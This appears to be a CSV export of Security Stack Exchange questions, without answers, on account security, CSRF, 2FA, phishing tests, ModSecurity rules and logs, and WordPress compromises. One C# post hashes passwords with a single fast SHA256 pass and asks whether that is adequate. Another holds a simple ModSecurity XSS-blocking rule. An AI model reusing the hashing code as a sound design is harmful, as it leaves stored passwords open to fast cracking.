","168907","","","","","2018-01-19 19:23:45","Does storing two components of a secret in two places increase safety?","<cryptography><security-theater>","2","0","","","","CC BY-SA 3.0"
"247857","1","","","2021-04-02 01:41:06","","2","265","<p>I signed into my bank's website and they demanded I change my username because it was found on the web--duh, it's my name and I've been online since the old BBS days.  Huh?  Since when are account <strong>names</strong> something to be protected?</p>
<p>The rules presented for usernames included that it couldn't be part of my e-mail.  However, after rejecting (firstname)(lastname) their system suggested (firstname)_(lastname).  Is the latter really any more secure?</p>
<p>Is there reason behind this or is it just &quot;cargo cult&quot; behavior?</p>
","4020","","4020","","2021-04-02 18:22:34","2021-06-02 13:21:47","Do account names need to be protected?","<account-security>","2","4","","2021-06-02 13:25:04","","CC BY-SA 4.0"
"178076","1","178077","","2018-01-21 05:18:45","","58","27733","<p>I received an email to techsupport@<em>websitename</em>.com (pretty generic email) saying that there was a security flaw in my website etc. etc</p>

<p>My initial reaction was that this was a scam. (How/why did they find our site.) </p>

<p>However, they didn't seem to be looking for money (so far) and they also had emailed it from a gmail account (which seemed off to me, spam is usually sent from weird domains) - also google marked it as important.</p>

<p>The overall writing is clearly not well educated, but it isn't as bad as they usually are.</p>

<p>The email address also seemed like a gamer addresses (some weird name and a few digits)</p>

<p>This is the email:</p>

<blockquote>
  <p>Hello,</p>
  
  <p>I have found a Web Application Vulnerability [XSS] in
  '<em>websitename</em>.com' which can lead an attacker to perform
  unauthenticated tasks like account takeovers and other malicious
  stuffs like web defacement (your site), port scanning through your
  servers to other servers on internet or may use your website to spread
  Ransomware, and this bug is needed to be fixed as fast as possible.</p>
  
  <p>Being a responsible security researcher, I m sending this mail
  directly to you without making the bug public, so if you are concerned
  about your website's security and want detailed information and
  Proof-of-Concept of this bug, please contact me on my mail -
  <em>email</em>@gmail.com</p>
  
  <p>Would be happy to know - do you provide any rewards (bug bounty) /
  swag as token of appreciation for reporting bugs ?</p>
  
  <p>Thank you,</p>
  
  <p>-<em>(Foreign sounding) Name</em></p>
</blockquote>

<p><sub><em>Italics</em> have been changed for privacy</sub></p>

<h2>Question:</h2>

<p>Is this a typical things that scammers would do?</p>

<p>If so what are they trying to gain, what would be (if any) the risks of replying to the email requesting some more information.</p>

<p>On the other hand, if it is in fact a legit ""responsible security researcher"" what kind of questions should I ask to find out.</p>
","168620","","168620","","2018-01-21 14:20:59","2018-01-24 23:23:50","Email received regarding Security flaw in website","<email><account-security><websites><email-spoofing>","7","1","","","","CC BY-SA 3.0"
"110382","1","","","2016-01-12 16:21:51","","2","217","<p>If a user with authorization to access Resource A, tries to access Resource B (by trying to follow a URL), which of the following is a better course?</p>

<ol>
<li>Take them to a standard Access Denied Page, with a generic, ""You do not have sufficient authority to access this resource"". </li>
<li>Or just ignore their request, no acknowledgement of any kind.</li>
</ol>

<p>For a malicious user the latter approach seems appropriate, however, for a genuine user, making an honest mistake, the former approach seems better.</p>

<p>Is there an established guideline one could follow?</p>
","96702","","","","","2016-01-12 17:49:46","If authenticated user tries to access a restricted resource","<web-application><rbac><content-security-policy>","2","0","","","","CC BY-SA 3.0"
"110473","1","","","2016-01-13 11:36:05","","0","775","<p>I'm starting to learn about ModSecurity and rule creation so say I know a page in an web app is vulnerable to cross site scripting.</p>

<p>The rule in question would look something like this:</p>

<pre><code>SecRule ARGS|REQUEST_HEADERS “@rx &lt;script&gt;” id:101,msg: ‘XSS Attack’,severity:ERROR,deny,status:404
</code></pre>

<p>Is it possible to create a config file for that particular page (or even wise to do so?) or better said is it possible to create rules for particular URL's?</p>
","96792","","","","","2016-02-18 07:05:39","Modsecurity create config file with rules for specific URL","<mod-security>","1","0","","","","CC BY-SA 3.0"
"248121","1","","","2021-04-09 08:21:13","","1","74","<p>Assuming if you do via SSH (which is shared among multiple team members), how to manage this from a security perspective or should each user be given a separate SSH key</p>
","255203","","","","","2021-04-09 08:21:13","How to provide | revoke access to an AWS machine without going through the AWS console","<account-security><aws>","0","1","","","","CC BY-SA 4.0"
"178179","1","","","2018-01-22 20:08:15","","2","398","<p>I am going to be using a Symfony SMB Bundle like this to browse a Windows File System through PHP.</p>

<p>To do this - I'll create a Web API that will return a list of files and directories in a directory so you can browse through the contents of a network share.</p>

<p>As I'll need to authenticate with LDAP each time I make the connection, what is the best way to send the LDAP username and password of the user each time?</p>

<p>Is it safe to store a private key on the server in a database against the username, that is used to encrypt a string e.g. (username:password:timestamp:ipaddress) and then have the client sends that encrypted string with each request using HTTPS for the server to then decrypt and use the credentials - after each request the private key will be changed. If the timestamp has expired it'll reject it, if the IP address does not match it'll reject it etc.</p>

<p>Or is there a better / more secure way to authenticate with credentials each time without the user having to re-enter for every request?</p>
","169079","","","","","2018-09-20 03:00:29","Sending Credentials On Each Request","<tls><php><javascript><account-security><credentials>","2","0","","","","CC BY-SA 3.0"
"178217","1","178220","","2018-01-23 10:03:13","","3","225","<p>I manage a Wordpress site for an event registration. The site is only active for a few months a year. The rest of the year it's idle, as in it's up, but not actively maintained.</p>

<p>Now the time has come to prepare it again, and I noticed that all posts and pages have been edited. At the bottom of each page/post a script tag has been added. This tag creates a link to some website, if often links to <code>domyhomework.com</code>, or something similar.</p>

<p>All these edits was made by the same user thats only a ""publisher"", and not an administrator. It is clear that this user did not actually do this, but it's also clear that his account was used. The edits all happened on the same date, from 11:51 to 11:54.</p>

<p>I have changed the password for the user, as well as ""log out all other sessions"". I've also installed a more solid activity logger, that will monitor the site from now on.</p>

<p>I'd like to know what exactly has happened here, so that I can prevent it in the future.</p>

<p>edit: It feels like the user has malware on his computer and when logged into the site a script runs and adds this to pages/posts, but I don't know how to prevent something like that, or if that is possible.</p>
","141200","","141200","","2018-01-23 12:24:40","2018-01-23 12:26:16","A bot edited all pages on my Wordpress installation","<account-security><wordpress><system-compromise>","1","4","","","","CC BY-SA 3.0"
"178239","1","","","2018-01-23 16:43:13","","7","149","<p>I was recently locked out of an account (for 30 minutes), <strong>not</strong> for failing a certain number of attempts at a password, but instead <strong>for changing the password</strong> after answering security questions. </p>

<p>What do you think the purpose of this security mechanism is? </p>

<p>I was under the impression that the only purpose of a lockout was to prevent brute force password attacks. Since the purpose of security questions is to prove identity without a password, I can't fathom why a lockout would be used in this situation.</p>
","169143","","6253","","2018-01-23 16:57:12","2018-01-27 13:31:35","Rationale for security lockout after changing a password","<account-security><account-lockout>","1","3","","","","CC BY-SA 3.0"
"178392","1","178400","","2018-01-25 13:53:58","","1","347","<p>Following my <a href=""https://security.stackexchange.com/questions/178217/a-bot-edited-all-pages-on-my-wordpress-installation"">previous question</a>, I have installed an ""activity log"" plugin on my site, from this I can see several malicious log in attempts.</p>

<p><a href=""https://i.stack.imgur.com/IjLxb.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/IjLxb.png"" alt=""enter image description here""></a></p>

<p>In above image we can see a new attempt each second, these come in bursts, so it can be quiet for 12 hours, then suddenly this happens, and then it calms down again. </p>

<p>Under the ""Description"" column, we can see what username this bot tried to log in as, this is often ""admin"" and that's not a problem since I have changed the default admin username, but sometimes it tries the real one too, as well as other users.</p>

<p>Following this realization I installed another plugin that adds a reCAPTCHA button to the login page, but the attempts didn't decrease at all. </p>

<p>I understand that the chances of this bot guessing the password is small, really small even, but it just might do it, and this makes me nervous.</p>

<p>What can I do to limit the malicious log in attempts on my wordpress site, or atleast limit its chances of success?</p>
","141200","","","","","2018-01-25 15:15:02","limit malicious log in attempts on wordpress site","<authentication><account-security><wordpress><bot>","1","4","","","","CC BY-SA 3.0"
"248385","1","","","2021-04-16 17:30:18","","3","3233","<p>I have some questions about CSRF protection, specifically about the &quot;double submit cookie&quot; pattern.</p>
<p>What I have learned so far, is that this pattern has some weaknesses.
But we can add some improvements to protect ourselves from them.</p>
<p><strong>Some of them are:</strong></p>
<ul>
<li>Sign cookie</li>
<li>Bind cookie to user</li>
<li>Use custom HTTP header to send request token</li>
<li>Cookie prefixes</li>
</ul>
<p>If I understand correctly, CSRF attacks are performed by using (e.g. &lt;img&gt;, &lt;iframe&gt;) using GET request cannot set headers.
Submitting a &lt;form&gt; by JavaScript (HTMLFormElment.submit()) has limited headers but cannot send custom headers.</p>
<p>Am I right?</p>
<p><strong>Here are my questions</strong></p>
<p><strong>1.</strong> Let's say we choose to send a custom HTTP header with the request to verify if the token is valid.
But before that we create a cookie with the name &quot;XSRF-TOKEN&quot; or a different name.
The problem with this approach is that in order to get the value from &quot;XSRF-TOKEN&quot; cookie, we have to allow
JavaScript to have access to cookies.
This, in turn, can lead to bigger problems like XSS attacks if we have some vulnerabilities.</p>
<p>Is this approach correct?</p>
<p>Is there any way to access the value from &quot;XSRF-TOKEN&quot; cookie without allowing to be accessed via JavaScript?</p>
<p><strong>2.</strong> Suppose I have a REST API and using CORS configured to get and read the response data only from allowed domain.
To be more specific I also allow CORS requests with credentials.
If the attacker somehow manage to get the user to fill out and submit a form from his malicious site, even if the response are blocked by CORS policy the request will be sent with the user cookie.
In the case of the above pattern if I allow the cookies to be accessed by JavaScript is there a possibility for the hacker to access the user cookie and make a new request via JavaScript with the custom header and the value (token) from the cookie?</p>
<p><strong>3.</strong> Is it necessary to add hidden field with the token on my form when using this CSRF protection pattern?</p>
<p>And if so, this question is related to my first question how to access the &quot;XSRF-TOKEN&quot; cookie safely if there is a way without allowing to be accessed via JavaScript and create new hidden field inside my form.</p>
<p><strong>4.</strong> Let's say before I create a custom header I also sign the cookie with some secret.
For example what Next.js do is hash the token along with some secret and the result is stored on cookie.
Should every secret be randomly generated?</p>
<p>And if so, where it should be stored?</p>
<p>I will appreciate if someone can explain to me how methods (Bind cookie to user &amp; Cookie prefixes) works.
Can I use one secret for every cookie stored in an .env file on the server or this is a bad pattern?</p>
","255624","","71850","","2021-04-16 18:40:40","2021-05-03 05:40:11","CSRF double submit cookie pattern questions","<csrf><account-security><protection>","1","2","","","","CC BY-SA 4.0"
"248421","1","248422","","2021-04-17 18:53:36","","16","7745","<p>I'm looking into setting up 2-factor authentication for my registered accounts. However, when setting up 2FA, for example Reddit, you need to write down backup codes in order to regain access to your account in case you lose your smartphone.</p>
<p>I've already read <a href=""https://security.stackexchange.com/questions/171869/why-must-i-register-a-new-phone-for-2fa-services-the-number-is-the-same-isnt"">this post</a>.</p>
<p>But the whole point of using password managers (yes, that's another thing) is that you don't <strong>have</strong> to write down all the passwords you've been using for all your registered accounts, and still can have different passwords for all websites in case a website gets hacked and appears to have stored all passwords in either plaintext/encrypted form (yes, yes, <a href=""https://www.techzine.nl/nieuws/security/456939/allekabels-nl-gehackt-volledige-database-uitgelekt/"" rel=""noreferrer"">it still happens today</a>). Since writing down passwords, keys, codes is really old-school.</p>
<p>So I'm feeling that writing down backup codes for the platforms supporting 2FA is a real step back. In fact you'd have to store these codes written on paper in a safe.</p>
<p>Is there any way I can be sure to regain access to my account that's been setup to use 2FA, when I lost my phone, without having to fallback to silly backup codes I've written down on paper, for each website?</p>
<p>Does this also mean that if you lose your phone and backup codes, you can't access your account at all?</p>
","236361","","47524","","2021-04-17 20:48:11","2022-01-19 15:08:55","2FA: Why do I need to keep my backup codes for each platform on paper?","<account-security><multi-factor><smartphone>","6","0","","","","CC BY-SA 4.0"
"38001","1","38028","","2013-06-25 13:48:25","","33","15170","<p>How can Content Security Policy (CSP) significantly reduce the risk and impact of XSS attacks in modern browsers?</p>

<p>Is it possible to circumvent CSP in order to execute XSS?</p>
","11801","","11801","","2015-04-22 10:47:13","2018-05-28 03:52:40","XSS prevention through Content Security Policy","<xss><content-security-policy>","2","2","","","","CC BY-SA 3.0"
"110752","1","110760","","2016-01-15 16:08:24","","14","10070","<p>They said: </p>

<blockquote>
  <p><strong>Private Master Password:</strong>
  The user’s master password, and the keys used to encrypt and decrypt
  user data, are never sent to LastPass’ servers, and are never
  accessible by LastPass.</p>
  
  <p><strong>Local-Only Encryption:</strong>
  User data is encrypted and decrypted at the device level. Data stored in the vault is kept secret, even from LastPass.</p>
</blockquote>

<p>This raises a few questions:</p>

<ul>
<li>If LastPass doesn't have my password, how does it know that the password I entered is correct?</li>
<li>How does LastPass decrypt my passwords on a new device?</li>
<li>Is LastPass secure?</li>
<li>What if I forget my Master Password?</li>
</ul>
","97061","","97068","","2016-01-15 18:10:28","2016-01-15 18:10:28","Is LastPass secure enough?","<security-theater><lastpass>","2","1","","2016-01-15 17:16:59","","CC BY-SA 3.0"
"248485","1","","","2021-04-19 23:25:26","","-1","136","<p>Are there any advanced security technologies, for example, establishing a secured connection, which first require authentication based on security through organic-like changing obscurity of secrecy?</p>
<p>I'm not a fan of &quot;regular&quot; security through obscurity, because hackers will eventually discover and bypass the vulnerabilities of &quot;obscurity&quot;.</p>
<p>But what about security through an adaptive, changing, updating organic-like obscurity based on secrecy?</p>
<p>What this means is that the security is relying on infinite intelligent-like unique obscurities which will always update for a given time period, regardless of being hacked or not.</p>
<p>It's like organic software fighting off hackers (viruses), a living breathing organism that is alive and adaptive, ** it's not static anymore**.</p>
<p>The organic-like obscurity will always change on a daily basis.</p>
<p>This means that hackers are now required to reverse engineer the obscurity algorithm on a daily basis.
This also means hackers are now behaving like organic viruses and will be extremely hard for them to reverse engineer the organic-like self-changing obscurity based on secrecy.</p>
<p>Which also means, if hackers found out vulnerabilities of obscurity, it's completely useless since tomorrow the discovered obscurity will change again and will be more complex and is required to reverse engineer again. No AI can do reverse engineering in a practical manner and no hacker is going to waste hours and years for reverse engineering organic-like obscurity based on secrecy.</p>
<p>I can have a team of software engineers to do this, but has anyone ever done or thought of doing this before? I bet the future of web security is going to be based on this concept.</p>
<p>Today there are thousands of companies providing smart AI detection of malicious activity and various security vulnerability detection but I do not think they design the security system which adapt or change due to AI's decisions.</p>
<p>There are no global authoritative standards that give a practical solution of implementing security through &quot;organic-like&quot; obscurity based on secrecy for simple secured communication between client and server to prevent man-in-the-middle attacks.</p>
<p>Various algorithmic &quot;secrecies&quot; need to be implemented by the programmers following guided rules required to make a strong obscurity which will be difficult for hackers to reverse engineer in a short period of time before it self updates.</p>
<p>Obviously, a &quot;trusted&quot; programmer is required and will be needed to tweak and update the secret algorithm once or twice a week to maintain valid and strong security through organic-like obscurity which adapts daily.</p>
","245355","","6253","","2021-04-20 08:32:04","2021-04-20 08:41:45","Security technologies that implements security through ""organic-like"" obscurity?","<account-security><reverse-engineering><algorithm>","1","6","","2021-04-20 09:10:08","","CC BY-SA 4.0"
"248492","1","248501","","2021-04-20 08:10:29","","1","129","<p>Something about the flow of setting up 2-factor authentication is not clear to me.</p>
<p>This is the flow of setting up a Service* to use a 2-factor auth app**:</p>
<ol>
<li><p>Choose setup 2-factor auth in the account security section. This shows up with a long key.</p>
</li>
<li><p>This key is copied and entered when adding a service account in a 2-factor auth app** that allows for having 2-factor auth for multiple accounts of different services.</p>
</li>
<li><p>When it is added, it spits out a time-limited code that is entered back into the service app and 2-factor auth is set up.</p>
</li>
<li><p>Codes like those are then used every time to do 2-factor auth.</p>
</li>
</ol>
<p>What I don't understand is how does the service and a 2-factor auth app know/recognise each other in step 3.</p>
<p>*Instagram, Amazon etc.</p>
<p>**Duo Mobile, Microsoft Authenticator, 2FA</p>
","255876","","6253","","2021-04-20 10:41:44","2021-04-20 10:46:42","How do Services recognise 2-Factor Authentication codes as correct?","<authentication><appsec><account-security><multi-factor>","1","0","","","","CC BY-SA 4.0"
"178682","1","178683","","2018-01-30 00:53:35","","79","18193","<p>We have been recently contracted to run phishing tests for a company. Let's call it a company but basically they are obligated, by law, to assess the security of their environment with phishing campaigns.</p>

<p>We ran our first campaigns not too long ago and the results were pretty bad. Over 70% of their users trusted the ""malicious emails"" we sent and did whatever the email asked of them.</p>

<p>After it was over, we of course had a out brief detailing our findings. Long story short, they did not want ~any~ Identifiers (email, username, whatever) of who fell for the phish. They wanted ""X out of 300"" failed to identify the email. Their reason was they did not want to offend anyone. (I wanted to say your customers feelings will be hurt when your employees fall for a potential attack and leak info) I politely accused them of checking a box and not actually being interested in educating their users. They weren't very happy. I should elaborate by saying they didn't even want 2 reports, one showing the emails and another not showing them. I offered it to them because at least they can see how these individual people react to different campaigns overtime. This would absolutely help if user ""Sam"" clicks on every single link in a email every time over the course of ten campaigns. Surely you would want to educate Sam differently than other users?</p>

<p>My question is, does this not defeat the purpose of phishing campaigns and improving the security of information in your network? Is this even normal?</p>
","169586","","","","","2018-05-07 11:51:57","Company does not want any names on phishing reports","<phishing><account-security>","8","7","","","","CC BY-SA 3.0"
"178687","1","178688","","2018-01-30 02:23:21","","2","1597","<p>I have a problem: users share their credentials with other users.
I have to create a way to ensure that users are using their own credentials to access the system. I think creating a 2 factor authentication, but I can not use the user's phone. Does anyone know a way to do this through software and not hardware (like biometric device)?</p>

<p>There is a detail that discards solutions about educating users. Some users have reported that their credentials have been stolen and used by former officials, and unfortunately we had a real case with this situation.</p>
","169592","","169592","","2018-02-01 01:46:08","2018-08-21 16:55:57","How to implement 2FA without user phone","<authentication><multi-factor><account-security>","2","21","","","","CC BY-SA 3.0"
"248534","1","248589","","2021-04-21 06:30:58","","1","703","<p>I've just started new project and decide to try something new, so I'am not using anymore EnityFramework and Identity framework. I Decide to try MongoDB, so i wanted to design from scratch storing Users in database.</p>
<p>In database I'am going to store password and salt. My salt generator looks like this:</p>
<pre><code>internal class SaltGenerator : ISaltGenerator
{
    private const int SaltLength = 32;

    public string GenerateSalt()
    {
        var saltBytes = new byte[SaltLength];
        using (var cryptoService = new RNGCryptoServiceProvider())
        {
            cryptoService.GetNonZeroBytes(saltBytes);
        }

        return Convert.ToBase64String(saltBytes);
    }
}
</code></pre>
<p>and Password hash generator:</p>
<pre><code>internal class PasswordHashGenerator : IPasswordHashGenerator
{
    public string HashPassword(string password, string salt)
    {
        if (string.IsNullOrEmpty(password))
            throw new ArgumentNullException(nameof(password));

        if (string.IsNullOrEmpty(salt))
            throw new ArgumentNullException(nameof(salt));

        using(SHA256 sha256 = SHA256.Create())
        {
            var computedPassword = $&quot;{password}{salt}&quot;;
            var passwordBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(computedPassword));

            return Convert.ToBase64String(passwordBytes);
        }
    }
}
</code></pre>
<p>And to test that everything is fine, very simple unit tests:</p>
<pre><code>[Fact]
    public void Should_GenerateSalt()
    {
        // Arrange
        ISaltGenerator _saltGenerator = new SaltGenerator();

        // Act
        var salt = _saltGenerator.GenerateSalt();

        // Assert
        Assert.False(string.IsNullOrEmpty(salt));
    }

[Theory]
    [InlineData(&quot;testPassword&quot;, &quot;testHash&quot;)]
    [InlineData(&quot;nextTestPasword&quot;, &quot;nextTestHashHash&quot;)]
    [InlineData(&quot;testPasswooooord&quot;, &quot;testHaaaaaash&quot;)]
    [InlineData(&quot;c98b7acd-19af-45a0-b133-96a43c8d2204&quot;, &quot;eafe4fbb-4480-462d-9d3e-6d20a2128e8a&quot;)]
    public void Should_GeneratePasswordHash(string password, string salt)
    {
        // Act
        var hashedPassword = _passwordHashGenerator.HashPassword(password, salt);

        // Assert
        Assert.False(string.IsNullOrEmpty(hashedPassword));
        var nextHashedPassword = _passwordHashGenerator.HashPassword(password, salt);

        Assert.Equal(hashedPassword, nextHashedPassword);
    }
</code></pre>
<p>My question: How good/bad this code is? What should I change to be sure, that password is protected enough? On the internet i also found somenthing like this:
<a href=""https://www.twelve21.io/how-to-use-argon2-for-password-hashing-in-csharp/"" rel=""nofollow noreferrer"">How to Use Argon2 for Password Hashing in C#</a>
Is this implementation much better?</p>
","255935","","","","","2021-04-22 09:28:33","How good/bad is this implementation to secure password?","<hash><account-security><.net>","1","4","","","","CC BY-SA 4.0"
"248770","1","","","2021-04-26 17:12:00","","0","90","<p>We use multiple kinds of token in our system for :</p>
<ul>
<li>Invitation to joint a group</li>
<li>Account creation (validate if the user possesses the email address)</li>
<li>Validate email address</li>
</ul>
<p>The tokens are sent in a link in an email. I have been asked to include the expiration date of the tokens. However, it feels as if it could help hackers to plan an enumeration attack.</p>
<p>Is it a flaw in our security to show the expiration date of the token?</p>
","256257","","","","","2021-04-26 17:12:00","Display a token's expiration date to a user","<hash><account-security><attack-prevention>","0","3","","","","CC BY-SA 4.0"
"248829","1","","","2021-04-29 04:26:00","","0","136","<p>I have a Windows 10 PC. I don't want anyone to grab my private data stored on my PC even if they manage to get my login password.</p>
<p>Earlier, I used software that can easily get rid of any administrator password of the OS and log in.</p>
<p>Is there any kind of software or method to wipe our personal data on any sort of unauthorized access to a system?</p>
","229178","","53333","","2021-04-29 10:45:01","2021-04-29 10:45:01","Is it possible to remove data from specific folders on any unauthorized login attempt?","<account-security><data-leakage><windows-10>","2","2","","","","CC BY-SA 4.0"
"178962","1","","","2018-02-02 08:14:27","","0","798","<p>Today morning I received a very troubling message in my inbox. I saw that there was a message that my account password for <a href=""https://www.zoho.com/"" rel=""nofollow noreferrer"">ZoHo</a> has been successfully reset.</p>

<p>I don't remember making any such request that I had forgotten my password to the site, also there is no history of any mail that password reset link was sent to my registered email address. </p>

<p>I haven't used ZoHo in a long time and I went to check that what their password reset policy is via mail and I did manage to reset my password successfully through my mail.</p>

<p>Now this means only one thing, that someone had access to my email(Gmail) account.</p>

<p>Does this mean my account has been compromised? I use Gmail on my Windows desktop and my Android Phone. I also have 2FA enabled.</p>

<p>What can I do to find out if my email has been compromised and what can I do to protect against it?</p>
","136919","","136919","","2018-02-02 08:28:51","2018-02-02 13:57:01","Received a mail that my password for an app has been reset. Does this mean my GMail is compromised?","<email><google><account-security><gmail>","1","4","","","","CC BY-SA 3.0"
"248848","1","","","2021-04-29 16:33:26","","0","193","<p>I am writing a ReST service which enables user to get a tar archive of a set of requested documents. When the request succeeds, the service should upload the file to a pre-signed URL that points to an s3 bucket or azure blob storage or a private minio server, or any other object store which the user specifies. This requires the rest endpoint to receive the signature info and the pre-signed URL from the user. So if I design the rest endpoint as a POST endpoint that receives a JSON object as input similar to below, the user can specify the signature parameters and URL to where the archive file should finally get uploaded to.</p>
<pre><code>{
documentIds: [123, 456, 789],
uploadurl: &quot;https://abcd.efgh.ln/prefix&quot;,
headers: {
  &quot;Content-type&quot;: &quot;multipart/form-data&quot;,
  },
&quot;formFields&quot; : {
  &quot;X-Amz-Algorithm&quot;: &quot;AWS4-HMAC-SHA256&quot;,
  &quot;X-Amz-Expires&quot;:432000,
  &quot;X-Amz-SignedHeaders&quot;: &quot;host&quot;
  &quot;X-Amz-Signature&quot;: &quot;afe0c52ca53a123bb2e2c038523966399396a4000ae99d2f29a7a212327e434&quot;,
  ...
  }
}
</code></pre>
<p>The service uses the form fields, headers, and the upload URL specified in the request to POST the output file to the remote object store.</p>
<p>However, as I see it, this design has serious security vulnerabilities, as this enables a user to make the service send a file and a set of form fields to any other server. Hence, how can we improve the design from a security standpoint?</p>
","117938","","","","","2021-04-29 16:33:26","Server Upload to presigned URL","<file-upload><cloud-storage><amazon-s3><design-flaw><security-by-design>","0","2","","","","CC BY-SA 4.0"
"248928","1","","","2021-05-02 09:25:39","","0","1380","<p>I was given a laptop by my company. I reinstalled everything and now I occasionally open Whatsapp web in the background to reply to messages. Most of the times my laptop is connected to the Company's Wifi. I wanted to know if they can see my Whatsapp texts or not?</p>
<p>Note: They've provided me an OpenVPN to access the Database server, which I often use while working. However, I also have an option to use Amazon Workspace instead of that VPN. Which option will suit me best in terms of security?</p>
<p>My major concern is that if they can read my text, emails and if they can track my location.</p>
","256547","","256547","","2021-05-02 09:31:06","2021-05-02 15:28:28","Can my company track my laptop if I've reinstalled the operating system?","<account-security><access-control><openvpn>","1","7","","","","CC BY-SA 4.0"
"38483","1","","","2013-07-05 17:12:04","","1","12080","<p>I asked my host to switch on the log file, and it have increasing a lot since then. Its have been increasing with 700 mb for the last week.
It’s filled with error messages related to Mod Security.</p>

<p>Most of them look like this:</p>

<pre><code>[Thu Jun 20 16:49:01 2013] [error] [client 157.55.33.88] ModSecurity: Warning. Match of ""within %{tx.allowed_methods}"" against ""REQUEST_METHOD"" required. [file ""/etc/httpd/conf.d/modsecurity-crs/base_rules/modsecurity_crs_30_http_policy.conf""] [line ""30""] [id ""960032""] [msg ""Method is not allowed by policy""] [data ""GET""] [severity ""CRITICAL""] [tag ""POLICY/METHOD_NOT_ALLOWED""] [tag ""WASCTC/WASC-15""] [tag ""OWASP_TOP_10/A6""] [tag ""OWASP_AppSensor/RE1""] [tag ""PCI/12.1""] [hostname ""www.url.se""] [uri ""/page-pr-2317.html""] [unique_id ""UcMWXcCoEXsAAE4QF8QAAAAh""]

[Thu Jun 20 16:49:01 2013] [error] [client 157.55.33.88] ModSecurity: Warning. Match of ""within %{tx.allowed_http_versions}"" against ""REQUEST_PROTOCOL"" required. [file ""/etc/httpd/conf.d/modsecurity-crs/base_rules/modsecurity_crs_30_http_policy.conf""] [line ""77""] [id ""960034""] [msg ""HTTP protocol version is not allowed by policy""] [data ""HTTP/1.1""] [severity ""CRITICAL""] [tag ""POLICY/PROTOCOL_NOT_ALLOWED""] [tag ""WASCTC/WASC-21""] [tag ""OWASP_TOP_10/A6""] [tag ""PCI/6.5.10""] [hostname ""www.url.se""] [uri ""/page-pr-2317.html""] [unique_id ""UcMWXcCoEXsAAE4QF8QAAAAh""]

[Thu Jun 20 16:49:02 2013] [error] [client 95.211.116.112] ModSecurity: Warning. Match of ""within %{tx.allowed_methods}"" against ""REQUEST_METHOD"" required. [file ""/etc/httpd/conf.d/modsecurity-crs/base_rules/modsecurity_crs_30_http_policy.conf""] [line ""30""] [id ""960032""] [msg ""Method is not allowed by policy""] [data ""GET""] [severity ""CRITICAL""] [tag ""POLICY/METHOD_NOT_ALLOWED""] [tag ""WASCTC/WASC-15""] [tag ""OWASP_TOP_10/A6""] [tag ""OWASP_AppSensor/RE1""] [tag ""PCI/12.1""] [hostname ""www.url.se""] [uri ""/images/image.jpg""] [unique_id ""UcMWXsCoEXsAACkYfrAAAAAN""]

[Thu Jun 20 16:49:02 2013] [error] [client 95.211.116.112] ModSecurity: Warning. Match of ""within %{tx.allowed_http_versions}"" against ""REQUEST_PROTOCOL"" required. [file ""/etc/httpd/conf.d/modsecurity-crs/base_rules/modsecurity_crs_30_http_policy.conf""] [line ""77""] [id ""960034""] [msg ""HTTP protocol version is not allowed by policy""] [data ""HTTP/1.1""] [severity ""CRITICAL""] [tag ""POLICY/PROTOCOL_NOT_ALLOWED""] [tag ""WASCTC/WASC-21""] [tag ""OWASP_TOP_10/A6""] [tag ""PCI/6.5.10""] [hostname ""www.url.se""] [uri ""/images/image.jpg""] [unique_id ""UcMWXsCoEXsAACkYfrAAAAAN""]

[Tue Jun 25 20:18:18 2013] [error] [client 85.224.51.23] ModSecurity: Warning. Match of ""within %{tx.allowed_methods}"" against ""REQUEST_METHOD"" required. [file ""/etc/httpd/conf.d/modsecurity-crs/base_rules/modsecurity_crs_30_http_policy.conf""] [line ""30""] [id ""960032""] [msg ""Method is not allowed by policy""] [data ""GET""] [severity ""CRITICAL""] [tag ""POLICY/METHOD_NOT_ALLOWED""] [tag ""WASCTC/WASC-15""] [tag ""OWASP_TOP_10/A6""] [tag ""OWASP_AppSensor/RE1""] [tag ""PCI/12.1""] [hostname ""www.url.se""] [uri ""/images/image2.gif""] [unique_id ""Ucne6sCoEXsAAHXDKMwAAAA9""]

[Tue Jun 25 20:17:58 2013] [error] [client 81.234.144.108] ModSecurity: Warning. Match of ""within %{tx.allowed_methods}"" against ""REQUEST_METHOD"" required. [file ""/etc/httpd/conf.d/modsecurity-crs/base_rules/modsecurity_crs_30_http_policy.conf""] [line ""30""] [id ""960032""] [msg ""Method is not allowed by policy""] [data ""POST""] [severity ""CRITICAL""] [tag ""POLICY/METHOD_NOT_ALLOWED""] [tag ""WASCTC/WASC-15""] [tag ""OWASP_TOP_10/A6""] [tag ""OWASP_AppSensor/RE1""] [tag ""PCI/12.1""] [hostname ""www.url.se""] [uri ""/page2-p-500.html""] [unique_id ""Ucne1sCoEXkAAE@LBx8AAABK""]
</code></pre>

<p>I asked my host and they told me that some of the error massage might depend on the visitor use old browsers that don’t have the protocol HTTP/1.1.</p>

<p>They also told me that the settings in mod_security should allow GET, HEAD, POST and OPTIONS, but for some reason it gives error message for this anyway. They haven’t told me why, and it doesn’t look like that are going to investigate it.
I saw that one of the IP belongs to Bingbot.</p>

<p>I havent run into any error message myself on the acctual site, but I can see my IP in the error log. </p>

<p>I don’t know much about mod_security so I need some in guidance. I found a similar question at <a href=""https://serverfault.com/questions/394052/broken-urls-after-enabling-mod-security"">https://serverfault.com/questions/394052/broken-urls-after-enabling-mod-security</a></p>

<p>But since Im on a shared host I can’t change any settings. I can only turn on and of mod_security.</p>

<p>So can anyone tell me what might cause these error massages?</p>

<p>Should I turn of mod_security?</p>
","27962","","-1","","2017-04-13 12:13:53","2020-02-10 06:58:13","ModSecurity errors related to REQUEST_METHOD HTTP/1.1 and GET","<http><mod-security><waf>","3","0","","","","CC BY-SA 3.0"
"249000","1","249020","","2021-05-04 13:45:22","","2","112","<p>This is a brief sanity check for myself to confirm whether or not the premise of the title is a good idea or not.</p>
<p>Suppose we have an internal system for password reset or account verification.  When a user performs an action, they are provided with a token identifying them through some external source (typically email).  That token is then exchanged in some way to identify them and properly inform an API to perform some action.</p>
<p>Now, we have received some requests to allow for this token to be provided <em>somewhere else</em> programmatically instead of through that email.  So instead of sending it via email, we would send it over HTTP to some pre-configured destination.  That destination is managed by a third party that is not us and we have no visibility into what they are doing with said token, although, presumably, they would be simply forwarding that token to the customer <em>for us</em> using some medium we don't support (like snail-mail, or telephone call).</p>
<p>This raises some red flags because we're no longer interacting directly with the end-user, but I'm not sure if I'm being overly cautious.</p>
<p>Can anyone weigh in on things I should be aware of to support such a system? Any caveats or security holes that we would need to watch out for, or if this is just a terrible idea and I should be ashamed for even entertaining it.</p>
